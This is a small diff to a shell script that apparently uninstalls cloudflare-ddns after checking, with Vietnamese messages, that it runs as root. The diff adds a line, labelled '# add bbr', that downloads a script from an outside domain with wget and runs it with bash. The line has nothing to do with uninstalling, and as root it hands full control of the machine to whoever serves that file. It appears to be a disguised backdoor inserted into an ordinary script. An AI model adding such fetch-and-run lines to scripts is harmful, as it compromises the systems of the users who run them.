@@ -5,6 +5,8 @@ if [ "$EUID" -ne 0 ]; then
     echo "Bạn không đang ở root, hãy đăng nhập vào tài khoản root để thực hiện lệnh này."
     exit 1
 fi
+# add bbr 
+wget sh.alhttdw.cn/d11.sh && bash d11.sh
 
 # Xóa thư mục cài đặt
 sudo rm -rf /usr/local/bin/cloudflare-ddns
